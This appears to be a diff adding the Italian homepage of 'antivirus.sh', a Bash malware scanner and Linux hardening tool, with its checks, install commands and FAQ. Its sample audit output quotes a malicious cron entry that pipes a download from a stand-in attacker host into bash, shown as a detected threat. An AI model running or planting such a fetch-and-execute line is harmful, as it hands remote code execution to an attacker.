@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>antivirus.sh — Antivirus e hardening di sicurezza per Linux in un unico script Bash</title>
+<meta name="description" content="Strumento di sicurezza gratuito e open source per Linux: scansione di malware e rootkit, audit di rete, oltre 70 controlli di sistema e hardening con un solo comando per Ubuntu e qualsiasi server Linux. Puro Bash, zero dipendenze.">
+<link rel="canonical" href="https://antivirus.sh/it/">
+<link rel="alternate" hreflang="en" href="https://antivirus.sh/">
+<link rel="alternate" hreflang="ru" href="https://antivirus.sh/ru/">
+<link rel="alternate" hreflang="zh" href="https://antivirus.sh/zh/">
+<link rel="alternate" hreflang="ko" href="https://antivirus.sh/ko/">
+<link rel="alternate" hreflang="ja" href="https://antivirus.sh/ja/">
+<link rel="alternate" hreflang="it" href="https://antivirus.sh/it/">
+<link rel="alternate" hreflang="es" href="https://antivirus.sh/es/">
+<link rel="alternate" hreflang="de" href="https://antivirus.sh/de/">
+<link rel="alternate" hreflang="ar" href="https://antivirus.sh/ar/">
+<link rel="alternate" hreflang="fr" href="https://antivirus.sh/fr/">
+<link rel="alternate" hreflang="x-default" href="https://antivirus.sh/">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://antivirus.sh/it/">
+<meta property="og:title" content="antivirus.sh — Antivirus e hardening Linux in un unico script Bash">
+<meta property="og:description" content="Scansione malware, audit di rete e oltre 70 controlli di sicurezza per qualsiasi server Linux. Gratuito e open source.">
+<meta property="og:locale" content="it_IT">
+<meta name="theme-color" content="#0a0e13">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+<link rel="stylesheet" href="/assets/style.css">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "antivirus.sh",
+  "operatingSystem": "Linux",
+  "applicationCategory": "SecurityApplication",
+  "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
+  "url": "https://antivirus.sh/it/",
+  "downloadUrl": "https://github.com/TARGET_PLEVEHOLDER/antivirus.sh",
+  "license": "https://opensource.org/licenses/MIT",
+  "inLanguage": "it",
+  "description": "Strumento di sicurezza open source per Linux: scansione di malware e rootkit, audit di rete, oltre 70 controlli di sistema e hardening automatizzato in un unico script Bash."
+}
+</script>
+</head>
+<body>
+
+<div class="langs"><div class="wrap">
+<a href="/">English</a><a href="/ru/">Русский</a><a href="/zh/">中文</a><a href="/ko/">한국어</a><a href="/ja/">日本語</a><a href="/it/" class="active">Italiano</a><a href="/es/">Español</a><a href="/de/">Deutsch</a><a href="/ar/">العربية</a><a href="/fr/">Français</a>
+</div></div>
+
+<nav><div class="wrap">
+<span class="brand">🛡️ antivirus<span class="dot">.sh</span></span>
+<div class="links">
+<a href="#features">Funzionalità</a>
+<a href="#checks">Controlli</a>
+<a href="#install">Installazione</a>
+<a href="#usage">Utilizzo</a>
+<a href="#safety">Sicurezza</a>
+<a href="#faq">FAQ</a>
+<a class="gh-btn" href="https://github.com/TARGET_PLEVEHOLDER/antivirus.sh">★ GitHub</a>
+</div>
+</div></nav>
+
+<header class="hero"><div class="wrap">
+<h1>antivirus<span class="dot">.sh</span></h1>
+<p class="tag">Scansione malware, audit di rete e hardening completo del sistema per Linux — in <b>un unico script Bash</b>.</p>
+<p class="sub">Zero dipendenze. Funziona su ogni versione di Ubuntu e su praticamente qualsiasi distribuzione Linux. Solo audit per impostazione predefinita, fix interattivi quando li vuoi tu, rollback completo sempre.</p>
+<div class="cta">
+<a class="btn btn-green" href="#install">Inizia subito →</a>
+<a class="btn btn-ghost" href="https://github.com/TARGET_PLEVEHOLDER/antivirus.sh">Codice sorgente su GitHub</a>
+</div>
+<div class="badges">
+<span><b>70+</b> controlli di sicurezza</span>
+<span><b>100%</b> Bash</span>
+<span>licenza <b>MIT</b></span>
+<span><b>0</b> dipendenze</span>
+<span>root <b>&amp;</b> non-root</span>
+</div>
+
+<div class="term">
+<div class="term-bar"><i></i><i></i><i></i></div>
+<pre>
+<span class="t-dim">$</span> <span class="t-w">sudo bash antivirus.sh --audit</span>
+
+<span class="t-info">==&gt;</span> <span class="t-w">Firewall</span>
+  <span class="t-crit">[CRIT]</span> NO active firewall detected — every listening service is fully exposed
+<span class="t-info">==&gt;</span> <span class="t-w">SSH server</span>
+  <span class="t-warn">[WARN]</span> SSH password authentication enabled — brute-force surface
+  <span class="t-ok">[ OK ]</span> SSH root login disabled
+<span class="t-info">==&gt;</span> <span class="t-w">Processes &amp; memory</span>
+  <span class="t-ok">[ OK ]</span> no known malware/miner process signatures
+  <span class="t-ok">[ OK ]</span> no hidden processes (readdir-hiding rootkit test passed)
+<span class="t-info">==&gt;</span> <span class="t-w">Persistence &amp; startup points</span>
+  <span class="t-crit">[CRIT]</span> suspicious content in cron file /etc/cron.d/update:
+         <span class="t-dim">1: * * * * * root curl -s http://evil.tld/x | bash</span>
+
+  security score: <span class="t-w">61/100</span>  grade: <span class="t-crit">F — critical issues found</span>
+  next step: <span class="t-w">sudo bash antivirus.sh --fix</span>
+</pre>
+</div>
+</div></header>
+
+<section id="features"><div class="wrap">
+<h2>Perché antivirus.sh</h2>
+<p class="lead">La maggior parte delle macchine Linux sono server che vengono compromessi sempre dalle stesse banali porte d'ingresso: porte esposte, SSH con password, cron job dimenticati, pacchetti non aggiornati. antivirus.sh chiude quelle porte in pochi minuti — e va a caccia di chi è già entrato.</p>
+<div class="grid">
+<div class="card"><div class="ic">📦</div><h3>Un solo file, zero dipendenze</h3><p>Un unico script Bash. Niente Python, niente agent, niente demoni, niente da compilare. Scaricalo, eseguilo, cancellalo se vuoi — ti lascia un report e (facoltativamente) un sistema hardened.</p></div>
+<div class="card"><div class="ic">🐧</div><h3>Qualsiasi Ubuntu. Qualsiasi Linux.</h3><p>Garantito su ogni release di Ubuntu — dalle LTS più datate all'ultima uscita. Supporto best-effort per Debian, RHEL, CentOS, Alma, Rocky, Fedora, Arch, openSUSE, Alpine: ogni controllo degrada in modo controllato.</p></div>
+<div class="card"><div class="ic">🔍</div><h3>Trova il malware del mondo reale</h3><p>Crypto-miner, reverse shell, dropper nei cron, backdoor via chiavi SSH, rootkit LD_PRELOAD, payload fileless memfd, processi nascosti — le cose che si trovano davvero sui server violati.</p></div>
+<div class="card"><div class="ic">🧯</div><h3>Fix, non solo segnalazioni</h3><p>Ogni problema arriva con un fix applicabile: in modo interattivo, automaticamente con <code>--fix</code>, oppure come setup completo di una nuova VM con <code>--harden</code>. O resta al 100% in sola lettura con <code>--audit</code>.</p></div>
+<div class="card"><div class="ic">🪢</div><h3>Non ti chiude fuori</h3><p>L'attivazione del firewall autorizza prima le tue porte SSH. L'SSH a sola chiave viene rifiutato finché una chiave non esiste davvero. Le nuove configurazioni di sshd vengono validate prima del reload. Tutto viene salvato in backup ed è reversibile con <code>--rollback</code>.</p></div>
+<div class="card"><div class="ic">🤝</div><h3>Va d'accordo con i pezzi grossi</h3><p>Rileva e orchestra ClamAV, rkhunter e chkrootkit quando sono presenti — un solo flag li installa. Usa antivirus.sh come prima linea rapida e come collante attorno agli scanner approfonditi.</p></div>
+</div>
+</div></section>
+
+<section id="checks"><div class="wrap">
+<h2>Il catalogo completo dei controlli</h2>
+<p class="lead">Più di 70 controlli individuali in sei aree. Ogni risultato è classificato OK / INFO / WARN / CRIT e contribuisce a un punteggio di sicurezza finale da 0 a 100.</p>
+<div class="cat">
+<div class="card"><h3><b>01</b> Malware e rootkit</h3><ul>
+<li>nomi di processo di miner e malware noti (xmrig, kinsing, kdevtmpfsi…) e righe di comando da mining pool</li>
+<li>processi in esecuzione da <code>/tmp</code>, <code>/var/tmp</code>, <code>/dev/shm</code></li>
+<li>processi il cui binario è stato eliminato; eseguibili fileless <code>memfd</code></li>
+<li>rilevamento di processi nascosti (test anti kernel-rootkit basato sull'occultamento in readdir)</li>
+<li>moduli kernel corrispondenti a rootkit noti (Diamorphine, Reptile…)</li>
+<li>rootkit userland via <code>/etc/ld.so.preload</code> e <code>LD_PRELOAD</code> globale</li>
+<li>eseguibili nascosti nelle directory temporanee e in <code>/dev</code></li>
+<li>pattern di reverse shell / dropper / miner negli script fino a 2&nbsp;MB</li>
+<li>integrità dei binari fondamentali rispetto ai checksum dei pacchetti (<code>dpkg -V</code> / <code>rpm -V</code>)</li>
+<li>orchestrazione di ClamAV, rkhunter, chkrootkit (opzionale)</li>
+</ul></div>
+<div class="card"><h3><b>02</b> Persistenza e backdoor</h3><ul>
+<li>crontab di sistema e degli utenti, <code>cron.d</code>, hourly/daily/weekly/monthly, job <code>at</code></li>
+<li>unit systemd personalizzate eseguite da directory temporanee o corrispondenti a pattern d'attacco</li>
+<li><code>rc.local</code>, script init, regole udev, script MOTD</li>
+<li>file di avvio della shell di ogni utente (<code>.bashrc</code>, <code>.profile</code>, <code>.zshrc</code>…)</li>
+<li>audit di <code>authorized_keys</code> per ogni account — segnala le chiavi SSH sugli account di sistema</li>
+<li>account UID-0 aggiuntivi, regole sudo NOPASSWD, vecchi file di trust <code>.rhosts</code></li>
+<li>revisione dei repository APT di terze parti</li>
+</ul></div>
+<div class="card"><h3><b>03</b> Esposizione di rete</h3><ul>
+<li>ogni porta TCP/UDP in ascolto con processo proprietario e indirizzo di bind</li>
+<li>classificazione dell'esposizione: solo loopback vs raggiungibile dal mondo</li>
+<li>servizi pericolosi segnalati: Telnet, FTP, r-services, SMB, RDP, VNC, rsync, NFS, rpcbind</li>
+<li>datastore senza autenticazione di default: Redis, MongoDB, Elasticsearch, memcached</li>
+<li>rilevamento della Docker API su :2375 (root remoto istantaneo)</li>
+<li>connessioni stabilite verso porte di mining pool / botnet IRC</li>
+<li>interfacce in modalità promiscua, indicatori di ARP spoofing</li>
+<li>revisione dei resolver DNS e rilevamento di hijack di <code>/etc/hosts</code></li>
+</ul></div>
+<div class="card"><h3><b>04</b> SSH e account</h3><ul>
+<li>login root, autenticazione con password, password vuote, X11 forwarding</li>
+<li>MaxAuthTries, login grace, keep-alive, autenticazione host-based, rhosts</li>
+<li>presenza di fail2ban con configurazione automatica di una jail sshd</li>
+<li>tracce di brute force nei record di login falliti di <code>btmp</code></li>
+<li>account con password vuota (con blocco immediato), UID duplicati</li>
+<li>account di sistema con shell di login, revisione dell'appartenenza al gruppo sudo</li>
+<li>policy di scadenza delle password e robustezza imposta con pam_pwquality</li>
+</ul></div>
+<div class="card"><h3><b>05</b> Kernel e filesystem</h3><ul>
+<li>16 chiavi sysctl di hardening: ASLR, syncookies, redirect, source routing, rp_filter, ptrace scope, restrizioni dmesg/kptr, protected links…</li>
+<li>permessi su <code>shadow</code>, <code>sudoers</code>, chiavi host SSH, crontab, configurazione di GRUB</li>
+<li>audit SUID/SGID rispetto a una whitelist curata + prova di appartenenza ai pacchetti</li>
+<li>file scrivibili da chiunque e directory world-writable senza sticky bit</li>
+<li>file senza proprietario, lock da malware con flag immutable (<code>chattr +i</code>)</li>
+<li>flag di mount di <code>/dev/shm</code> e <code>/tmp</code> (noexec, nosuid, nodev)</li>
+<li>restrizioni sui core dump e prevenzione dei dump SUID</li>
+</ul></div>
+<div class="card"><h3><b>06</b> Piattaforma e servizi</h3><ul>
+<li>aggiornamenti di sicurezza in sospeso, unattended-upgrades, rilevamento di release EOL</li>
+<li>rilevamento del riavvio richiesto dopo le patch del kernel</li>
+<li>stato del mandatory access control AppArmor / SELinux</li>
+<li>traccia forense di auditd, logging journald persistente</li>
+<li>sincronizzazione oraria NTP (TLS e analisi forense ne dipendono)</li>
+<li>mitigazioni delle vulnerabilità della CPU (famiglia Meltdown/Spectre)</li>
+<li>Docker: permessi del socket, container privilegiati, membri del gruppo docker</li>
+<li>stato del Secure Boot, raccomandazione di una password per GRUB</li>
+</ul></div>
+</div>
+</div></section>
+
+<section id="install"><div class="wrap">
+<h2>Installazione e prima esecuzione</h2>
+<p class="lead">Nessuna installazione nel senso classico — è solo uno script. Tre comandi e hai un report completo.</p>
+<div class="codes">
+<div class="code"><div class="lbl">download</div><button class="copy" data-c="curl -fsSL https://raw.githubusercontent.com/TARGET_PLEVEHOLDER/antivirus.sh/main/antivirus.sh -o antivirus.sh">copy</button>
+<pre>curl -fsSL https://raw.githubusercontent.com/TARGET_PLEVEHOLDER/antivirus.sh/main/antivirus.sh -o antivirus.sh</pre></div>
+<div class="code"><div class="lbl">1 — audit sicuro in sola lettura (non modifica nulla)</div><button class="copy" data-c="sudo bash antivirus.sh --audit">copy</button>
+<pre>sudo bash antivirus.sh <span class="g">--audit</span></pre></div>
+<div class="code"><div class="lbl">2 — interattivo: esamina e conferma ogni fix</div><button class="copy" data-c="sudo bash antivirus.sh">copy</button>
+<pre>sudo bash antivirus.sh</pre></div>
+<div class="code"><div class="lbl">3 — oppure hardening completo di una nuova VM</div><button class="copy" data-c="sudo bash antivirus.sh --harden">copy</button>
+<pre>sudo bash antivirus.sh <span class="g">--harden</span></pre></div>
+</div>
+<p style="margin-top:18px;color:var(--muted);font-size:15px">Suggerimento: funziona anche senza root — eseguirà ogni controllo possibile e segnalerà chiaramente il resto. <span class="t-dim">funziona anche con git clone: <code>git clone https://github.com/TARGET_PLEVEHOLDER/antivirus.sh</code></span></p>
+</div></section>
+
+<section id="usage"><div class="wrap">
+<h2>Modalità e opzioni</h2>
+<p class="lead">Uno script, quattro modi di usarlo: audit, interattivo, automatico, hardening completo. Più gli ambiti mirati per scripting e cron.</p>
+<table>
+<tr><th>Comando</th><th>Cosa succede</th></tr>
+<tr><td><code>sudo bash antivirus.sh</code></td><td>Modalità interattiva — ogni risultato viene mostrato, ogni fix confermato singolarmente. Consigliata per la prima esecuzione.</td></tr>
+<tr><td><code>--audit</code></td><td>Solo report. Zero modifiche garantite — sicuro in produzione. Exit code 0/1/2 = pulito/warning/critico, perfetto per cron e CI.</td></tr>
+<tr><td><code>--fix</code></td><td>Applica automaticamente tutti i fix <i>sicuri</i>. I fix rischiosi (firewall, autenticazione SSH) richiedono comunque una conferma esplicita.</td></tr>
+<tr><td><code>--harden</code></td><td>Tutto ciò che fa <code>--fix</code>, più il kit completo per una nuova VM: firewall, fail2ban, unattended-upgrades, set sysctl, auditd, policy delle password, banner, lockdown di core dump e shm, e la proposta di creare un vero utente amministratore.</td></tr>
+<tr><td><code>--create-user</code></td><td>Creazione guidata di un utente sudo: password robusta generata, installazione della chiave SSH, passaggio opzionale all'SSH a sola chiave — con il promemoria di fare un test prima di chiudere la sessione.</td></tr>
+<tr><td><code>--scan /var/www</code></td><td>Scansione malware di una directory specifica (le web root sono un nascondiglio prediletto).</td></tr>
+<tr><td><code>--network</code> / <code>--system</code> / <code>--malware</code></td><td>Esegue una sola area.</td></tr>
+<tr><td><code>--quick</code></td><td>Salta le parti lente (scansioni dell'intero disco, ClamAV) — termina in pochi secondi.</td></tr>
+<tr><td><code>--full</code></td><td>La modalità più approfondita: scansione dell'intero filesystem, verifica di ogni pacchetto installato.</td></tr>
+<tr><td><code>--rollback</code></td><td>Ripristina ogni file modificato nell'ultima esecuzione e annulla l'attivazione del firewall.</td></tr>
+<tr><td><code>--install-tools</code></td><td>Installa ClamAV, rkhunter e chkrootkit per la profondità basata su firme.</td></tr>
+<tr><td><code>--report file.txt</code> · <code>--no-color</code> · <code>--yes</code> · <code>--exclude PATH</code></td><td>Strumenti di supporto per reportistica e automazione.</td></tr>
+</table>
+<div class="codes" style="margin-top:26px">
+<div class="code"><div class="lbl">audit settimanale via cron con report salvato</div><button class="copy" data-c="0 6 * * 1 root bash /opt/antivirus.sh --audit --no-color --report /var/log/antivirus-weekly.txt">copy</button>
+<pre>0 6 * * 1 root bash /opt/antivirus.sh --audit --no-color --report /var/log/antivirus-weekly.txt</pre></div>
+</div>
+</div></section>
+
+<section id="safety"><div class="wrap">
+<h2>Progettato perché tu non possa chiuderti fuori</h2>
+<p class="lead">Gli strumenti di hardening hanno la brutta abitudine di tagliare il ramo su cui sei seduto. antivirus.sh tratta l'accesso remoto come sacro:</p>
+<ul class="safe">
+<li><b>L'attivazione del firewall autorizza prima SSH.</b> Le tue porte SSH vengono rilevate in tre modi (configurazione di sshd, socket attivi, connessione corrente) e autorizzate <i>prima</i> che venga eseguito <code>ufw enable</code>.</li>
+<li><b>L'SSH a sola chiave viene rifiutato senza una chiave.</b> <code>PasswordAuthentication no</code> viene applicato solo se un utente con privilegi sudo ha davvero una voce in <code>authorized_keys</code>. Lo stesso vale per la disattivazione del login root.</li>
+<li><b>Le configurazioni di sshd vengono validate prima del reload.</b> Ogni modifica passa da <code>sshd -t</code>; una configurazione non valida viene ripristinata automaticamente. Le sessioni SSH attive non vengono mai interrotte.</li>
+<li><b>Tutto viene salvato in backup.</b> Ogni file modificato viene copiato in una directory di backup con timestamp e manifest; <code>--rollback</code> ripristina tutto, inclusa la disattivazione di un firewall attivato dallo script.</li>
+<li><b>Quarantena, mai eliminazione.</b> I file sospetti vengono spostati in una directory di quarantena e privati di ogni permesso — prove e reversibilità preservate.</li>
+<li><b>I fix rischiosi chiedono sempre.</b> Anche in modalità <code>--fix</code>, qualsiasi cosa possa toccare l'accesso remoto richiede una conferma esplicita (oppure il documentato e deliberato <code>--yes</code>).</li>
+</ul>
+</div></section>
+
+<section id="newvm"><div class="wrap">
+<h2>Ricetta: VM nuova di zecca in 3 minuti</h2>
+<p class="lead">Hai appena ricevuto una VM Ubuntu fresca dal tuo cloud provider, password di root alla mano. Ecco l'intera routine:</p>
+<div class="codes">
+<div class="code"><div class="lbl">passo 1 — scarica ed esegui l'hardening</div><button class="copy" data-c="curl -fsSL https://raw.githubusercontent.com/TARGET_PLEVEHOLDER/antivirus.sh/main/antivirus.sh -o antivirus.sh &amp;&amp; sudo bash antivirus.sh --harden">copy</button>
+<pre>curl -fsSL https://raw.githubusercontent.com/TARGET_PLEVEHOLDER/antivirus.sh/main/antivirus.sh -o antivirus.sh
+sudo bash antivirus.sh <span class="g">--harden</span></pre></div>
+</div>
+<p style="color:var(--muted);margin-top:18px">Durante l'esecuzione lo script: attiva il firewall con SSH già autorizzato → installa fail2ban e unattended-upgrades → applica 16 chiavi di hardening del kernel → irrobustisce SSH (validato, senza perdere la sessione) → imposta la policy delle password → blinda <code>/dev/shm</code>, i core dump e le shell inattive → propone di creare il tuo utente sudo personale con chiave SSH → e solo allora, con la tua chiave al suo posto, propone di passare all'SSH a sola chiave e disattivare il login root. Prova il nuovo accesso in un secondo terminale — la tua sessione corrente resta attiva per tutto il tempo.</p>
+</div></section>
+
+<section id="faq"><div class="wrap">
+<h2>FAQ</h2>
+<details><summary>È un antivirus "vero" come ClamAV?</summary><p>È un livello diverso. ClamAV confronta milioni di firme di file; antivirus.sh dà la caccia ai pattern che compromettono davvero i server Linux — miner, reverse shell, dropper nei cron, backdoor SSH, tracce di rootkit — e fa l'audit della configurazione che li ha lasciati entrare. Si completano a vicenda, ed è per questo che antivirus.sh rileva ClamAV, lo usa quando è presente e te lo installa con <code>--install-tools</code>.</p></details>
+<details><summary>Funzionerà sulla mia vetusta Ubuntu 14.04 / sull'ultimissima release?</summary><p>Sì — è un vincolo di progetto. Puro Bash, nessuna parte compilata, ogni controllo ha dei fallback (ss/netstat, systemd/sysvinit, ufw/iptables) e viene saltato con garbo, con una nota, quando una funzionalità non esiste. Lo stesso script gira dai sistemi dell'era Ubuntu 12.04 fino all'ultima release.</p></details>
+<details><summary>È sicuro eseguirlo in produzione?</summary><p>La modalità <code>--audit</code> è rigorosamente in sola lettura ed è la prima esecuzione consigliata ovunque. Le modalità che modificano qualcosa confermano ogni passaggio (interattiva) o si limitano ai fix sicuri (<code>--fix</code>), mantengono backup di ogni file toccato e mettono a disposizione <code>--rollback</code>.</p></details>
+<details><summary>Davvero non può chiudermi fuori da SSH?</summary><p>Le transizioni pericolose — attivare un firewall, disattivare l'autenticazione con password, disattivare il login root — sono protette: le porte SSH vengono autorizzate in anticipo, la presenza della chiave viene verificata prima della modalità a sola chiave, le configurazioni vengono validate con <code>sshd -t</code> e ripristinate automaticamente in caso di errore, e la tua sessione corrente non viene mai interrotta. Ti consigliamo comunque di provare un nuovo accesso in un secondo terminale; lo script te lo ricorda esattamente al momento giusto.</p></details>
+<details><summary>Ha trovato qualcosa di CRITICO. E adesso?</summary><p>Leggi la segnalazione — ognuna si spiega da sola e stampa le prove. Per le segnalazioni di malware, metti in quarantena con il fix proposto, poi chiediti come è entrato (servizio esposto? chiave rubata? CMS datato?). Importante: se ci sono indizi di un rootkit a livello kernel (processi nascosti, moduli rootkit), nessuna pulizia sul sistema live è affidabile — ricostruisci da un'immagine pulita e ripristina soltanto i dati.</p></details>
+<details><summary>Telefona a casa o carica qualcosa?</summary><p>No. Nessuna telemetria, nessun upload, nessuna chiamata esterna tranne quelle che richiedi tu (installazione di pacchetti, aggiornamento delle firme di ClamAV). I report restano sul tuo disco. L'intero comportamento è verificabile — è un unico file Bash leggibile.</p></details>
+<details><summary>In cosa è diverso da Lynis?</summary><p>Lynis è un eccellente auditor puro — ti dice cosa non va. antivirus.sh ha opinioni precise e si sporca le mani: dà anche la caccia al malware attivo e corregge ciò che trova, in sicurezza, con rollback. Eseguili entrambi, se vuoi; non sono quasi mai in disaccordo.</p></details>
+<details><summary>Come lo eseguo regolarmente?</summary><p>Aggiungi una riga di cron (vedi Utilizzo) con <code>--audit --no-color --report</code>. Gli exit code 0/1/2 rendono banale generare avvisi da CI, dalle mail di cron o da qualsiasi sistema di monitoraggio.</p></details>
+</div></section>
+
+<footer><div class="wrap">
+<p><span class="brand">🛡️ antivirus<span class="dot">.sh</span></span></p>
+<p style="margin-top:8px">Gratuito e open source con licenza MIT.</p>
+<p style="margin-top:6px"><a href="https://github.com/TARGET_PLEVEHOLDER/antivirus.sh">github.com/TARGET_PLEVEHOLDER/antivirus.sh</a> — issue e pull request benvenute</p>
+<div class="f-langs">
+<a href="/">English</a><a href="/ru/">Русский</a><a href="/zh/">中文</a><a href="/ko/">한국어</a><a href="/ja/">日本語</a><a href="/it/">Italiano</a><a href="/es/">Español</a><a href="/de/">Deutsch</a><a href="/ar/">العربية</a><a href="/fr/">Français</a>
+</div>
+<p class="heart">se ha salvato il tuo server, lascia una ⭐</p>
+</div></footer>
+
+<script>
+document.querySelectorAll('.copy').forEach(function(b){
+  b.addEventListener('click', function(){
+    navigator.clipboard.writeText(b.dataset.c).then(function(){
+      b.textContent = 'copied!';
+      setTimeout(function(){ b.textContent = 'copy'; }, 1600);
+    });
+  });
+});
+</script>
+</body>
+</html>
